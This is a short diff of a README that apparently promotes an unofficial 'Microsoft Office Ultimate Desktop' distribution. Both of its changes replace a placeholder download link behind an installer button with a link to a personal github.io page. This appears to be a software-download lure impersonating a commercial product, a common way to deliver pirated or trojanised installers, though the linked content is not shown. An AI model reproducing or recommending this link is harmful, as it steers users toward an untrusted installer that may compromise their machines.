@@ -17,7 +17,7 @@ The distribution supports document and spreadsheet formats, bundled templates, a
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://avasnow-makes78.github.io/microsoft-office-ultimate-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Portable and installed modes coexist cleanly because each maintains its own conf
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://avasnow-makes78.github.io/microsoft-office-ultimate-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
